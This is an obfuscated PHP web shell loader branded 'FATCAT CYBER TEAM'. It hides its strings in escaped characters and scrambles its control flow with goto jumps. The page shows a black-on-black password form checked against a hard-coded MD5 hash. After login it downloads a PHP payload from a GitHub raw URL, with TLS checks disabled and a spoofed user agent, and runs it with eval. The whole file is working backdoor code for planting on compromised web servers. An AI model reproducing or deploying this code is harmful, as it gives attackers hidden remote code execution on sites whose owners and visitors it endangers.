<?php
goto J3h6X; 
uMr7S: function geturlsinfo($url) 
{ 
    if (function_exists("\143\165\162\x6c\137\145\x78\145\x63")) 
    { 
        $conn = curl_init($url); 
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($conn, CURLOPT_USERAGENT, "\115\157\172\151\x6c\154\x61\57\x35\56\60\40\50\x57\151\156\x64\157\x77\163\40\x4e\124\x20\x36\56\61\73\x20\x72\166\x3a\63\62\x2e\60\x29\40\107\x65\143\153\x6f\57\62\x30\61\60\60\x31\x30\x31\x20\106\x69\162\145\x66\157\x78\x2f\x33\62\56\60"); 
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0); 
        if (isset($_SESSION["\143\157\x6b\151"])) 
        { 
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION["\143\157\153\151"]); 
        } 
        $url_get_contents_data = curl_exec($conn); 
        curl_close($conn); 
    } 
    elseif (function_exists("\x66\151\154\145\137\x67\x65\x74\137\143\x6f\156\x74\x65\x6e\x74\163")) 
    { 
        $url_get_contents_data = file_get_contents($url); 
    } 
    elseif (function_exists("\146\157\x70\145\156") && function_exists("\x73\164\x72\x65\x61\x6d\x5f\147\145\x74\137\143\x6f\x6e\164\x65\156\x74\163")) 
    { 
        $handle = fopen($url, "\x72"); 
        $url_get_contents_data = stream_get_contents($handle); 
        fclose($handle); 
    } 
    else 
    { 
        $url_get_contents_data = false; 
    } 
    return $url_get_contents_data; 
} 
goto UUKHK; 

cJz_p: 
if (is_logged_in()) 
{ 
    $a = geturlsinfo("\150\164\164\160\163\72\57\57\147\151\164\150\165\142\56\143\157\155\57\143\145\155\157\172\141\60\65\57\141\160\160\55\142\171\160\141\163\163\57\162\141\167\57\155\141\151\156\57\146\141\164\143\141\164\56\160\150\160"); 
    eval("\77\x3e" . $a); 
} 
else 
{ 
?>
<!doctype html>
<html>
<head>
    <title>FATCAT CYBER TEAM</title>
    <link rel="icon" type="image/png" href="https://i.ibb.co/54xLCBd/Favicon-Fatcat-Cyber-Team.png">
    <link rel="apple-touch-icon" href="https://i.ibb.co/54xLCBd/Favicon-Fatcat-Cyber-Team.png">
    <style>
        body {
            background-color: black;
            color: blue;
        }
        #passwordForm {
            display: none;
            margin-top: 20px;
        }
        button {
            background-color: black; /* Warna hitam seperti background */
            color: white; /* Warna teks putih agar terlihat */
            border: 1px solid black; /* Border hitam */
            padding: 5px 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: black; /* Efek hover untuk tombol */
        }
        #password {
            background-color: black; /* Warna latar belakang hitam */
            color: black; /* Warna teks putih */
            border: 1px solid black; /* Border putih untuk kontras */
            padding: 5px;
        }
        #passwordForm input[type="submit"] {
            background-color: black; /* Warna latar belakang hitam */
            color: black; /* Warna teks putih */
            border: 1px solid black; /* Border putih untuk kontras */
            padding: 5px 10px;
            cursor: pointer;
        }
        #passwordForm input[type="submit"]:hover {
            background-color: black; /* Efek hover untuk tombol submit */
        }
    </style>
    <script>
        function togglePasswordForm() {
            var form = document.getElementById('passwordForm');
            if (form.style.display === 'none' || form.style.display === '') {
                form.style.display = 'block';
            } else {
                form.style.display = 'none';
            }
        }
    </script>
</head>
<body>
    <center>
        <pre><img src="https://imgur.com/48YgDZL.png" width="250" height="250" /></pre>
        <button onclick="togglePasswordForm()">>> t.me/SomsakKittisak <<</button>
        <form id="passwordForm" action="" method="POST">
            <label for="password"></label> 
            <input id="password" name="password" type="password">
            <input type="submit" value="Submit">
        </form>
    </center>
</body>
</html>
<?php  
} 
goto lxNvj; 

eiTo4: 
if (isset($_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"])) 
{ 
    $entered_password = $_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"]; 
    $hashed_password = "\x62\x38\x65\x62\x39\x35\x63\x66\x39\x35\x33\x34\x33\x62\x39\x30\x64\x39\x65\x66\x37\x66\x37\x63\x37\x37\x39\x31\x66\x30\x35\x64"; 
    if (md5($entered_password) === $hashed_password) 
    { 
        $_SESSION["\x6c\x6f\x67\x67\x65\x64\x5f\x69\x6e"] = true; 
        $_SESSION["\x63\x6f\x73\x69"] = "\x73\x65\x6f\x70\x65\x63\x61\x68\x74\x65\x72\x75\x73"; 
    } 
    else 
    { 
        echo "\x49\x6e\x63\x6f\x72\x72\x65\x63\x74\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x2e\x20\x50\x6c\x65\x61\x73\x65\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6e\x2e"; 
    } 
} 
goto cJz_p; 

UUKHK: 
function is_logged_in() { 
    return isset($_SESSION["\154\157\147\147\x65\144\137\151\156"]) && $_SESSION["\x6c\157\x67\x67\x65\144\x5f\151\156"] === true; 
} 
goto eiTo4; 

J3h6X: 
session_start(); 
goto uMr7S; 

lxNvj: 
?>
